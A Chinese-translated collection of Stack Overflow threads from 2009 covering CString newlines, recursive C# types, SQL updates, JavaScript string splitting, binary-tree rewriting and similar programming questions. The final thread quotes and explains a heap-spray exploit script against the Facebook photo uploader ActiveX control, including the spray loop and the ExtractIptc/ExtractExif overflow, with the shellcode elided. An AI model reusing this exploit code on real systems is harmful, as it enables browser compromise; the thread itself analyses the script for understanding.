当我还是一个年轻的编码员时，我在 Windows 上写入 .txt 文件并在记事本中打开它时遇到了同样的问题。换行符显示为这些方块。如果您希望在记事本中出现换行符，请使用“\r”。这不是一个真正的解决方案，但我有一种直觉，这是你的问题......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T18:12:35.517

你的意思是未转义的版本？如果是这样，那就逃跑吧

```
CString("\\n"); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T18:16:47.080

换行符是单引号中的 '\n'。只需将其添加到您的 cstring 中即可。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-17T01:04:57.130

```
CString strMessage = "";

strMessage.Format("Alpha \n Beta"); 
```

“\n”在调试器中显示为框字符，但在 UI 上显示时它会正确显示。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-07-01T10:39:19.777

```
CString cs = "First sentence."+"\015\012"+"Second sentence." 
```

我希望它会帮助你。

# c# - 食人族课程

> ID：651552
> 
> 赞同：11
> 
> 时间：2009-03-16T18:14:58.443
> 
> 标签：c#, .net

一段时间以来，我一直试图弄清楚为什么允许编译某些“食人”类的原因。

在我继续之前，也许我应该解释一下我所说的“食人族”课程。不确定我是否只是发明了这个术语，或者它是否已经存在了一段时间，或者即使我正确使用它，但现在这并不重要。

我基本上将食人阶级称为消耗自身的阶级。换句话说，一个类的接口声明了它自己类型的成员。例如：

```
class Foo
{
    public Foo SomeFoo; 
} 
```

正如您在上面看到的，类 Foo 有一个 Foo 类型的成员（本身）。

现在，我第一次看到这个（很久以前）我没想到它会编译但令我惊讶的是它确实编译了。我之所以没有编译它，是因为对我来说，这尖叫着某种递归的噩梦。

为了让事情更复杂一点，我决定尝试同样的事情，但将类设为一个结构，例如：

```
struct Foo
{
    public Foo SomeFoo; 
} 
```

不幸的是，这不会编译，而是会出现错误：***'Foo' 类型的 Struct member 'Foo.SomeFoo' 导致结构布局中的循环***

对我来说，编译错误比没有错误更有意义，但我相信这种行为最有逻辑解释，所以我想知道你们中的任何人是否可以解释这种行为。

谢谢。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-03-16T18:19:06.513

您不能设计这样的结构的原因是，在为结构分配一些默认值时必须对其进行初始化。所以，当你有一个`Foo`像你描述的结构并创建一个`Foo`......

```
Foo x; // x = default(Foo) 
```

它调用`Foo`. 但是，该默认构造函数必须为该`Foo.SomeFoo`字段提供默认值。

嗯，怎么找到的？它必须调用`default(Foo)`。其中，为了构造 a `Foo`，必须为该`Foo.SomeFoo`字段提供一个默认值......正如您所猜测的，这是一个递归的噩梦。

由于您可以创建对类的空引用，并避免立即实际创建该类的实例，因此没有问题；你可以打电话`new Foo()`，`Foo.SomeFoo`只是为空。不需要递归。

**附录**：当您考虑这一点时，如果您仍然感到困惑，我认为其他答案有另一种考虑它的好方法（相同的基本问题，不同的方法）-当程序为 a 分配内存时`Foo`，它应该如何去做吧？什么`sizeof(Foo)`时候`Foo`包含一些东西，然后是另一个整体`Foo`？你不能那样做。

相反，如果它是一个类，它只需要分配几个字节来引用 a `Foo`，而不是实际`Foo`的 ，这没有问题。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-03-16T18:20:30.550

不同之处在于 Foo 是一个引用类型。类内存布局将有一个指向 Foo 实例的指针，这很好。

在结构的情况下，你基本上有一个无限递归的内存布局，这是行不通的。

现在，如果您的类尝试在其自己的构造函数中实例化 Foo，那么您将遇到堆栈溢出问题。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-03-16T18:21:59.580

它们被称为递归类型，它们很常见。例如，一棵树通常根据引用其他节点的“节点”来实现。这没有什么自相矛盾的，只要它们相互*引用*但不相互*包含*。

作为解决这个问题的一种方法，整数的平方始终是另一个整数。这没什么奇怪的，它只是两个整数之间的引用或关系。但是你不能有一个*包含*自身完整副本作为子字符串的字符串。这就是区别。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T18:19:13.673

```
class Foo
{
    public Foo SomeFoo; 
} 
```

此示例中的 SomeFoo 只是一个链接 - 不会产生**递归创建问题**。
正因为如此，犬类才能存在。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T18:47:16.417

好的我明白了。

因此，为了说明这一点，如果我理解正确，编译器并不关心该成员是 Foo、Bar 还是其他类型。编译器只需要知道它需要为该成员变量分配的字节数。

因此，如果将其编译为 32 位操作系统，那么我假设编译器在技术上将 Foo 类型的声明更改为：

```
class Foo
{
    public Int32 SomeFoo; 
} 
```

编译器实际上看到的是 32 位（有点），而不是“Foo”。

谢谢。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-16T18:51:46.217

要了解为什么允许这样做以及它如何有用，经典的链表实现就是一个很好的例子，请查看本教程

[http://cyberkruz.vox.com/library/post/c-tutorial-linked-list.html](http://cyberkruz.vox.com/library/post/c-tutorial-linked-list.html)

你看，他们定义了一个节点类，如下所示：

```
public class LinkedList
{

    Node firstNode;

    public class Node
    {

        Node previous;
        Node next;
        int value;
    }
} 
```

每个节点都指向上一个和下一个节点，因此将其视为与另一个对象的链接是一个好的开始。

如果你以前没有做过链接列表，我强烈推荐它，因为它是一个很好的练习。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T18:18:26.377

那么，您是否将 Singleton 实现称为 canibal 类？

```
public class ShopSettings
{
  public static ShopSettings Instance
  {
    get
    {
      if (_Instance == null)
      {
        _Instance = new ShopSettings();
      }

      return _Instance;
    }
  }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-16T18:21:07.057

正如他们所说，它是一个值类型，因此它不能包含自己，因为它不能工作（考虑一下）。

但是，您可以执行以下操作：

```
unsafe struct Foo
{
  public Foo* SomeFoo;
} 
```

# c# - Unity 框架解决错误

> ID：651556
> 
> 赞同：2
> 
> 时间：2009-03-16T18:16:02.667
> 
> 标签：c#

当 UnityContainer.Resolve 方法运行时出现错误，它指出...

谁能帮我从哪里开始解决这个问题？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T18:19:00.213

你可能有循环依赖。

# ms-access - 在 VBA 中，如何返回报表对象的基础查询名称？

> ID：651558
> 
> 赞同：1
> 
> 时间：2009-03-16T18:16:22.310
> 
> 标签：ms-access, vba, report

我想获取特定报告背后的查询名称。我希望做这样的事情......

```
 Dim QueryName As String
 QueryName = CurrentProject.AllReports(MyReportName).RecordSource.Name 
```

但是，我知道这不起作用，但我想找到一种方法来做到这一点。有什么我明显忽略的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T19:04:17.013

您必须打开报告才能访问这些类型的属性。

在设计模式下打开，这样你就不会真正运行这个东西。

```
Dim QueryName As String

DoCmd.OpenReport MyReportName, acViewDesign

QueryName = Reports(MyReportName).RecordSource

DoCmd.Close acReport, MyReportName 
```

# sql - 具有有趣行为的 T-SQL 查询

> ID：651559
> 
> 赞同：0
> 
> 时间：2009-03-16T18:16:27.940
> 
> 标签：sql, sql-server, sql-server-2005, tsql

假设您有以下两个表：

**X 表**

**X_ID** **Y_ID_F** **X_Value**

```
1     1     Q
2     1     G
3     1     T
4     2     W
5     2     K
... 
```

**Y表**

**Y_ID** **Y_Value**

```
1     A
2     B
... 
```

您只想查询 Y 父级值为 A 的属性并更新它们，因此您编写如下查询（我意识到有更好的查询，但请耐心等待）：

```
 UPDATE X set X_Value = 'O' 
WHERE X_ID IN
(
select distinct X.X_ID FROM X
INNER JOIN Y ON X.Y_ID_F = Y.Y_ID
WHERE Y.Y_Value = 'A'
) 

```

我以前认为这会像它看起来所说的那样：更新连接 Y 表的 Y_Value = 'A' 的 X 表的行。但是，似乎 X.X_ID 会导致 X 表中的所有行都被更新，而不仅仅是您认为 WHERE 子句限制它的行。不知何故， X.X_ID 导致查询完全忽略 where 子句限制更新行集的尝试。关于为什么的任何想法？

**编辑：我认为这可能与我正在查询的数据库中的表的关联方式有关，而不是像我试图模棱两可的示例那么简单。**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T18:20:56.760

我从来没有在 UPDATE 语句中使用子选择。相反，请尝试以下操作：

```
UPDATE X SET X_Value = 'O'
FROM Y
WHERE Y.Y_ID = X.Y_ID_F
  AND Y.Y_Value = 'A' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T18:37:25.737

这对我来说也没有任何意义，所以我尝试了一下。运行更新语句后，表 X 的内容如下所示：

```
X_ID   Y_ID   X_VALUE
1      1      O
2      1      O
3      1      O
4      2      W
5      2      K 
```

换句话说，我预期的结果。你确定这里没有别的东西在起作用吗？我确实注意到您的示例查询中有一个小异常：在连接条件中对“X.Y_ID_F”的引用，我希望只看到“X.Y_ID”。我以为这只是一个错字。

# bookmarks - AWStats 如何确定用户已为您的网站添加了书签？

> ID：651561
> 
> 赞同：1
> 
> 时间：2009-03-16T18:16:53.727
> 
> 标签：bookmarks, awstats

我刚刚读到 AWStats 中有一个功能可以估计有多少用户将您的网站添加到他们的收藏夹/书签中。考虑到 AwStats 只是一个日志分析器，这是如何工作的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T18:19:01.583

AWStats[通过跟踪对 favicon.ico 的点击来](http://awstats.sourceforge.net/docs/awstats_glossary.html#AddToFavourites)计算该统计数据。在旧版本的 IE 中，只有当用户为您的网站添加书签时，才会点击该文件。在较新的版本（以及所有最新版本的 Firefox）中，无论如何都会命中该文件。该统计数据对 IE6 及以下版本很有用，但总的来说它是有缺陷的。

# version-control - 关于代码管理的好教程？

> ID：651562
> 
> 赞同：5
> 
> 时间：2009-03-16T18:17:14.037
> 
> 标签：version-control

我很长时间以来一直在编码，但我从未使用过 CVS 或 SVN 之类的代码管理系统。

您能否建议任何从基础开始的指南，然后介绍各个软件的概念及其复杂性。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T18:21:19.207

Eric Sink 的[Source Control HOWTO](http://www.ericsink.com/scm/source_control.html)是一个很好的（非工具特定的）介绍，虽然我不知道它是否与最新的[DVCS 保持同步](http://en.wikipedia.org/wiki/Distributed_revision_control)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:22:35.977

你读过 SVN 的书吗？

[http://svnbook.red-bean.com/](http://svnbook.red-bean.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T18:21:07.867

可以在[这里找到非常好的](http://wiki.darcs.net/DarcsWiki/GettingStarted)[darcs](http://darcs.net)的一个非常基本的版本。

你应该在 20 分钟内准备好！

完成上面的小教程后，请参阅[更多文档的链接](http://wiki.darcs.net/DarcsWiki)。如果你理解了这个概念，几乎每个 darcs 命令都可以在[darcs 备忘单](http://parmenioon.free.fr/darcs-cheat-sheet.pdf)中找到（只有一页！）。

看起来 darcs 是一个非常基本的版本控制系统，但实际上它支持其他 VCS（我知道）所没有的独特功能（例如，在不丢失补丁标识的情况下挑选补丁樱桃）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T18:25:12.350

我会先阅读关于这两者的维基百科文章

CVS 可以在[这里找到](http://en.wikipedia.org/wiki/Concurrent_Versions_System)

颠覆可以在[这里找到](http://en.wikipedia.org/wiki/Subversion_(software))

[然后有关 Subversion 的更多详细信息，您可以在此处](http://svnbook.red-bean.com/)查看红皮书。

我不知道 CVS 的等价物。

[最后，您可以从此处](http://en.wikipedia.org/wiki/Revision_control)的 Wikipedia 开始了解版本控制的概述。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T19:02:52.930

我最喜欢的关于该主题的文档仍然[是软件配置管理中的高级最佳实践](http://www.perforce.com/perforce/bestpractices.html)。这是一份出色的白皮书，当我需要向同事介绍良好的 SCM 实践时，我仍然将其用作参考。这是摘要：

> 在部署新的 SCM（软件配置管理）工具时，实施者有时会专注于完善细粒度的活动，同时不知不觉地从他们以前的工作或以前的工具中继承了糟糕的大规模实践。结果是一个执行良好的错误。本文介绍了一些反映作者部署 SCM 经验的高级最佳实践。

# javascript - 获取拆分字符串数组的最后一个元素

> ID：651563
> 
> 赞同：244
> 
> 时间：2009-03-16T18:17:49.263
> 
> 标签：javascript, split

我需要获取具有多个分隔符的拆分数组的最后一个元素。分隔符是逗号和空格。如果没有分隔符，它应该返回原始字符串。

如果字符串是“你今天过得怎么样？” 它应该返回“今天？”

如果输入是“hello”，则输出应该是“hello”。

如何在 JavaScript 中做到这一点？

* * *

## 回答 #1

> 赞同：960
> 
> 时间：2009-03-16T18:40:31.720

一切都有一条线。:)

```
var output = input.split(/[, ]+/).pop(); 
```

* * *

## 回答 #2

> 赞同：151
> 
> 时间：2009-03-16T18:23:25.613

```
const str = "hello,how,are,you,today?"
const pieces = str.split(/[\s,]+/)
const last = pieces[pieces.length - 1]

console.log({last})
```

此时，`pieces`是一个数组并`pieces.length`包含数组的大小，因此要获取数组的最后一个元素，请检查`pieces[pieces.length-1]`. 如果没有逗号或空格，它将简单地输出给定的字符串。

```
alert(pieces[pieces.length-1]); // alerts "today?" 
```

* * *

## 回答 #3

> 赞同：96
> 
> 时间：2012-06-12T18:20:31.627

```
var item = "one,two,three";
var lastItem = item.split(",").pop();
console.log(lastItem); // three 
```

* * *

## 回答 #4

> 赞同：35
> 
> 时间：2018-12-11T20:08:17.350

有史以来最好的一个，我最喜欢使用`split`和`slice`

```
const str = "hello, how are you today?"
const last = str.split(' ').slice(-1)[0]
console.log({last})
```

另一个正在使用`split`最后`pop`一个。

```
const str = "hello, how are you today?"
const last = str.split(' ').pop()
console.log({last})
```

* * *

## 回答 #5

> 赞同：32
> 
> 时间：2018-12-18T21:13:41.743

您还可以考虑反转您的数组并获取第一个元素。这样您就不必知道长度，但它并没有带来真正的好处和缺点，即使用大数组进行反向操作可能需要更长的时间：

```
array1.split(",").reverse()[0] 
```

虽然这很容易，但也修改了有问题的原始数组。这可能是也可能不是问题。

参考：[https ://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/reverse](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/reverse)

不过，您可能想使用它：

```
array1.split(",").pop() 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-02-01T22:06:16.130

如果你不想构造一个数组......

```
var str = "how,are you doing, today?";
var res = str.replace(/(.*)([, ])([^, ]*$)/,"$3"); 
```

英文分解如下：

```
/(anything)(any separator once)(anything that isn't a separator 0 or more times)/ 
```

替换只是说用最后一个分隔符之后的东西替换整个字符串。

因此，您可以看到如何普遍应用它。注意原始字符串没有被修改。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2021-11-24T08:20:37.497

有多种方法可以获取最后一个元素

```
let input='one,two,three,four';

let output1 = input.split(',').pop();
console.log('output1 =',output1);

let split = input.split(',');
let output2 = split[split.length-1];
console.log('output2=',output2);

let output3 = input.split(',').reverse()[0];
console.log('output3=',output3);

let output4 = input.split(',').slice(-1)[0];
console.log('output4=',output4);
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2021-11-24T11:54:20.743

这种方式很容易理解，而且很短。

```
const output = input.split(',').pop().split(' ').pop(); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-01-16T10:59:48.843

```
var title = 'fdfdsg dsgdfh dgdh dsgdh tyu hjuk yjuk uyk hjg fhjg hjj tytutdfsf sdgsdg dsfsdgvf dfgfdhdn dfgilkj,n, jhk jsu wheiu sjldsf dfdsf hfdkdjf dfhdfkd hsfd ,dsfk dfjdf ,yier djsgyi kds';
var shortText = $.trim(title).substring(1000, 150).split(" ").slice(0, -1).join(" ") + "...More >>"; 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-07-19T18:34:24.173

您可以直接访问数组索引：

`var csv = 'zero,one,two,three'; csv.split(',')[0]; //result: zero csv.split(',')[3]; //result: three`

# algorithm - 二叉树的排列

> ID：651565
> 
> 赞同：10
> 
> 时间：2009-03-16T18:18:23.147
> 
> 标签：algorithm, language-agnostic, binary-tree

考虑一个二叉树：

1.  *n*是一个节点，如果*n*是一个整数
2.  (+ *a* *b* ) 是一个节点，如果*a*和*b*是节点。

我们有以下三个操作：

1.  (+ *a* *b* ) -> (+ *b* *a* )
2.  (+ (+ *a* *b* ) *c* ) -> (+ *a* (+ *b* *c* ))
3.  (+ *a* (+ *b* *c* )) -> (+ (+ *a* *b* ) *c* ) *-- (2\. 反向)*

我需要一种算法来使用这些操作给出给定树的所有可能排列。任何操作都可以应用于任何子树。对于排列，我的意思是任何具有完全相同的叶子的树。这可能不是很困难，但我似乎无法弄清楚。

[编辑]叶子也可以是名称（即变量），因此不能选择将它们的属性作为整数。树确实代表了总和。

[Edit2] 本练习的重点是通过查找*A*和*-A*形式的项来减少总和，将树调成子树 (+ *A* *-A* ) 以消除它们。上面这三个操作是我系统中的公理，需要一直用到，否则无法证明归约树与原树相等。由于我使用的是[十二](http://twelf.plparty.org/wiki/Main_Page)逻辑编程语言，如果我能找出一个算法来完成我最初提出的要求，其余的就很容易了，但当然欢迎替代解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T18:51:34.253

似乎最直接的解决方案是对树进行深度优先遍历，将所有节点收集到一个列表中，生成列表的所有排列，将每个排列转储到二叉树中。

因此，给定列表 (+ a (+ bc) )，我们有节点 [a; 乙; c]，具有以下排列：

```
[a; b; c]
[a; c; b]
[b; a; c]
[b; c; a]
[c; a; b]
[c; b; a] 
```

列表中的第一项是您的头部，以下两项是子节点，接下来的四项是子子节点，依此类推。

如果您需要生成所有可能的树的列表，而不仅仅是平衡的树，则此操作的复杂性[会显着增加。](http://en.wikipedia.org/wiki/Combinatorial_explosion)在这种情况下，您需要像这样对它们进行分组：

```
[a; b; c; d]
[(a; b); c; d]
[(a; b; c); d]
[a; (b; c); d]
[a; (b; c; d)]
[a; b; (c; d)]
[a; b; d; c]
// first permutation
[(a; b); d; c]
[(a; b; d); c]
... 
```

其中每个 n 元组是一组节点。对于不止几个节点，宇宙将在你的算法完成之前经历热寂。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:47:26.587

这个问题的解决方案无疑将包括[加泰罗尼亚数字](http://en.wikipedia.org/wiki/Catalan_number#Applications_in_combinatorics)。有*C* [*n* -1]个可能的二叉树，有*n 个*叶子，并且有*n*！叶子的可能排序，所以有*n*！* *C* [*n* -1]种可能的树。不过，枚举它们有点棘手。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T18:47:57.710

这些操作类似于具有以下属性的加法：闭包、结合性、交换性。对于一个匹配节点，每个节点的叶子集合都是相同的，并且可以以递归方式应用。计算给定节点 x 的排列（在 Haskell 和 F# 的一些奇怪组合中）

```
let count x = match x with
  | LeafNode -> 1
  | TreeNode (a,b) -> 2 * count a * count b 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T22:08:38.990

您具有关联性和交换性，因此您可以自由移动元素。解决此问题的实用方法如下所示：

*   把树梳到一边，你会得到一个列表。

*   对列表进行排序，使应该取消的元素彼此相邻。

*   将元素移动到子树中并取消。

要获得所需的证明，您必须为这些操作构建小证明，然后将其组合起来。

或者，您可以查找 AC 匹配。

按照您的建议尝试所有排列只会让您获得巨大的组合爆炸。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-17T00:19:45.790

正如所指出的，如果你真的有交换性和结合性公理，你最好只收集和处理它们作为一个集合或一个列表。

如果这不令人满意，接下来要观察实际上您似乎不需要*所有*排列，但是您想重写表达式以简化它们。这可以比产生所有排列更有效！

但是，重复:)，如果您只有交换性和关联性，请处理一组中的术语。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-17T12:34:33.107

我发现了减少树木的根本问题的解决方案：

1.  从树中找到一对叶子 A 和 -A。
2.  a) 如果 A 和 -A 在同一个孩子中，则递归。
3.  b) 'Bubble' A 和 -A 到它们各自孩子的顶部。有八种可能的结果情况，但它们看起来都像这样 (+ (x A) (-A y))。从那个到 (+ (+ xy) (+ A -A)) 很容易。

正如建议的那样，另一种方法是首先将树转换为列表：(+ A (+ B (+ ...)) X)，然后找到匹配的 A 和 -A 对并将它们置于顶部。我怀疑这可能会产生比上述算法更长的证明（这是不可取的），尽管我没有尝试过。

尽管如此，我发现最初的问题很吸引人，我想尝试基于该算法的算法与上述问题的比较。

# .net - 如何在 LINQ to SQL 中创建“只读”属性？

> ID：651572
> 
> 赞同：4
> 
> 时间：2009-03-16T18:19:12.613
> 
> 标签：.net, linq-to-sql, readonly

我有一个属性（“IsLatest”），我已将“只读”设置为“真”

这是 XML：

```
<Column Name="IsLatest" Type="System.Boolean" DbType="Bit NOT NULL" IsReadOnly="true" CanBeNull="false" /> 
```

为什么代码生成器会生成公共的“get”**和“SET”**访问器？

另外，有没有办法让它*不*为只读属性生成 SET（多么新颖的想法）？

注意：我正在使用带有 .NET 3.5 SP1 的 V2008 SP1

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T23:45:01.537

编辑：我刚刚检查过，它**没有**生成设置器......你使用的是 3.5SP1 吗？

* * *

如果你是手工做的，我认为你可以；您只需在更新时使用 Storage 属性属性（on `ColumnAttribute`）将其指向字段（get 满足查询要求）..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-17T11:37:57.267

编辑：我已将成功的解决方法添加到此答案的底部。

这很奇怪......但是，如果我将“Access”属性设置为**'Public' 以外的任何东西**，“set”就会消失：

使用“Access=Public”和“ReadOnly=True”：

```
public bool IsLatest
{
    get
    {
        return this._IsLatest;
    }
    set
    {
        if ((this._IsLatest != value))
        {
            this.OnIsLatestChanging(value);
            this.SendPropertyChanging();
            this._IsLatest = value;
            this.SendPropertyChanged("IsLatest");
            this.OnIsLatestChanged();
        }
    }
} 
```

使用“Access=Protected”和“ReadOnly=True”：

```
protected bool IsLatest
{
    get
    {
        return this._IsLatest;
    }
} 
```

我不知道为什么存在这个错误（至少对我来说？），但如果我让它工作（公共和只读），我会更新这个答案。

编辑：这是可悲的解决方法：

我已经从我的 DBML 文件中删除了该属性，并简单地添加了我自己的“部分”类并自己设置了列：

```
public partial class ServicerData
{
    private bool _IsLatest = default(bool);

    [Column(Storage = "_IsLatest", AutoSync = AutoSync.Always, DbType = "Bit NOT NULL", IsDbGenerated = true, UpdateCheck = UpdateCheck.Never)]
    public bool IsLatest
    {
        get
        {
            return this._IsLatest;
        }
    }
} 
```

这不是我想做的，但似乎没有别的办法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T18:29:28.767

如果没有 setter，Linq to Sql 将如何为该属性赋值？这意味着如果它从数据库中获取数据，无论是通过 Linq 查询还是来自 Store 过程的结果，Linq 必须能够根据这些结果为您创建这些对象。如果没有设置属性，它就不能这样做。

# flash - 如何在 XHTML 1.0 Strict 网页中嵌入 SWF 对象？

> ID：651575
> 
> 赞同：2
> 
> 时间：2009-03-16T18:19:56.887
> 
> 标签：flash, xhtml, embed, standards-compliance

简单的问题：我正在寻找一种符合标准的方式来嵌入 Flash 文件。我一直在为这个项目使用 Dreamweaver（不是因为我喜欢它，而是因为我的同事不是 HTML 专家）并且它显然使用非标准代码来嵌入 Flash 文件。它在 HTML 中可能是标准的，但在我更喜欢使用的 XHTML 中却不是。

符合标准的方法是什么？我宁愿不使用每个人似乎都在使用的 JavaScript 库，我正在寻找一个纯 XHTML 解决方案，以便在未启用 JavaScript 时我的页面优雅地降级。

谢谢，如果需要，我可以发布我现有的不合规代码。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-16T18:32:57.683

[这是有关沙爹方法的一些信息。](http://www.alistapart.com/articles/flashsatay)

符合标准的方法是使用 <object /> 标记，并设置适当的类型。但是，跨不同浏览器的支持非常粗略。您最好的选择是真正使用 swfObject 之类的 javascript 库将 flash 替换/嵌入到给定的 div 标签中。

在大多数情况下，那些禁用 javascript 的人可能没有 flash，或者也禁用了 flash。此外，也可以更轻松地测试 div 中要替换为 flash 的后备 html。

老实说，我不喜欢它，但它确实是确保它有效的最简单方法......如果你选择走这条路，下面是一个例子。

```
 <object id="myflash" type="application/x-shockwave-flash" data="myfile.swf">
    <param name="movie" value="myfile.swf" />
  </object> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:32:37.403

[沙爹法](http://www.alistapart.com/articles/flashsatay/ "沙爹法")

# excel - 使用 Excel VBA 显示 CommandBar 按钮的标题

> ID：651577
> 
> 赞同：2
> 
> 时间：2009-03-16T18:20:24.810
> 
> 标签：excel, excel-2007, commandbar, vba

我正在尝试使用 Excel VBA 将按钮添加到新的 CommandBar（用于加载项选项卡）。如果我使用 FaceId，我可以将按钮放入功能区并显示图像，但我无法显示标题。有没有办法做到这一点？我必须改用图像吗？

```
With Application.CommandBars.Add("Open Forms")
    With .Controls.Add(msoControlButton)
        .OnAction = "ThisWorkbook.FunctionFunction"
        .Caption = "Call the Function"
    End With

    .Visible = True
End With 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-12-27T17:36:20.450

您需要按如下方式设置新按钮的样式属性：

```
 .Style = msoButtonIconAndCaption 
```

该样式还有其他选项（例如 msoButtonCaption）。您可以通过智能感知轻松查看列表。

# javascript - 我不明白这个代码

> ID：651590
> 
> 赞同：6
> 
> 时间：2009-03-16T18:22:09.953
> 
> 标签：javascript, security, exploit

我不明白这个代码片段：

```
function ms(){ 
    var plc=unescape('".
    unescape( '\x43\x43\x43\x43\n.............\xEF'. $URL).CollectGarbage(); 
    if (mf)return(0);
    mf=1; 
    var hsta=0x0c0c0c0c,hbs=0x100000,pl=plc.length*2,sss=hbs-(pl+0x38);
    var ss=gss(addr(hsta),sss),hb=(hsta-hbs)/hbs;
    for(i=0;i<hb;i++) m[i]=ss+plc; 
    hav();
    return(1); 
    } 
```

在上面的函数中，我似乎无法弄清楚变量类型，或者弄清楚它对`hsta`变量做了什么，以及它分配给它的内容：

```
var hsta=0x0c0c0c0c,hbs=0x100000,pl=plc.length*2,sss=hbs-(pl+0x38);
var ss=gss(addr(hsta),sss),hb=(hsta-hbs)/hbs;
for(i=0;i<hb;i++)m[i]=ss+plc; 
```

我也无法弄清楚这个功能：

```
function fb(){
    try {
        var obj=null;
        obj=cobj('{5C6698D9-7BE4-4122-8EC5-291D84DBD4A0}');
        if(obj){
            ms();
            var buf = addr(0x0c0c0c0c);
            while (buf.length < 400) buf += buf;
            buf = buf.substring(0,400);
            obj.ExtractIptc = buf;
            obj.ExtractExif = buf;
            }
       } catch(e){}
    return 0;
    } 
```

下面的代码是什么意思？

> `cobj('{5C6698D9-7BE4-4122-8EC5-291D84DBD4A0}')`

这是一个什么样的变量？

```
var buf = addr(0x0c0c0c0c);
buf = buf.substring(0,400);
obj.ExtractIptc = buf;
obj.ExtractExif = buf; 
```

最重要的是，该代码片段试图做什么？

这里还有一些功能：

```
function hex(num,width){
    var digits='0123456789ABCDEF';
    var hex=digits.substr(num&0xF,1);
    while(num>0xF){
        num=num>>>4;
        hex=digits.substr(num&0xF,1)+hex;
        } 
    var width=(width?width:0);
    while(hex.length<width)hex='0'+hex;
    return hex; 
}

function addr(addr){
    return unescape('%u'+hex(addr&0xFFFF,4)+'%u'+hex((addr>>16)&0xFFFF,4));
    } 
```

任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-03-16T18:36:34.583

这是一个试图利用与 Facebook 相关的安全漏洞的 JavaScript 片段，更具体地说，是其图像上传器客户端 ActiveX 控件。

该`cobj`部分尝试创建一个 ClassID 对象，该对象`{5C6698D9-7BE4-4122-8EC5-291D84DBD4A0}`恰好是 ActiveX 照片上传器控件。ExtractIptc 和ExtractExif 函数属于该特定的ActiveX 控件。

代码的核心实际上是内存地址操作、移位、使用掩码来分隔高位和低位。例如，`hex((addr>>16)&0xFFFF,4))`获取一个地址，将其向右移动 16 位，清除较低部分并将其转换为十六进制数。要真正理解大部分代码，您应该拥有正确的调试工具。

谷歌搜索`{5C6698D9-7BE4-4122-8EC5-291D84DBD4A0}`ClassID 给出了一些你应该研究的有趣结果：

[http://www.kb.cert.org/vuls/id/776931](http://www.kb.cert.org/vuls/id/776931)

[http://seclists.org/fulldisclosure/2008/Feb/0023.html](http://seclists.org/fulldisclosure/2008/Feb/0023.html)

[http://securitytracker.com/alerts/2008/Feb/1019297.html](http://securitytracker.com/alerts/2008/Feb/1019297.html)

请注意，这不是 PHP。它是 JavaScript。

**更多细节...**

cobj 可能被翻译成 CreateObject() 调用。每个注册的 ActiveX 控件都有自己的类 ID，它们的格式为`{0000000000-0000-0000-0000-000000000000}`. 当您想要引用已注册的库并创建它的实例时，您可以使用它的名称或类 ID。

ActiveX 控件本身应该是您计算机上的 .OCX 或 .DLL 文件。如果您可以找到该文件并对其进行调试，您将获得有关 ExtractIptc 和 ExtractExif 函数的最具体的详细信息。同样，这两个函数在以特定方式调用时似乎存在漏洞，而这正是该脚本试图利用的漏洞。

该`var hsta=0x0c0c0c0c`部分定义了一个变量hsta，等于十六进制数0c0c0c0c。这和写作一样`var hsta = 202116108`。在计算机工程中，处理十六进制地址比处理十进制数字更容易，因为计算机内存中的地址和数据是二进制的，可以直接表示为十六进制数字。有关十六进制的更多详细信息：[http](http://en.wikipedia.org/wiki/Hexadecimal) ://en.wikipedia.org/wiki/Hexadecimal 。

变量名 hsta 似乎是匈牙利符号（第一个字母代表变量类型 - h 代表十六进制）。因此，我假设它表示*十六进制起始地址*（hsta）。按照同样的思路，我的猜测是这`pl`意味着有效载荷和`plc`有效载荷代码。

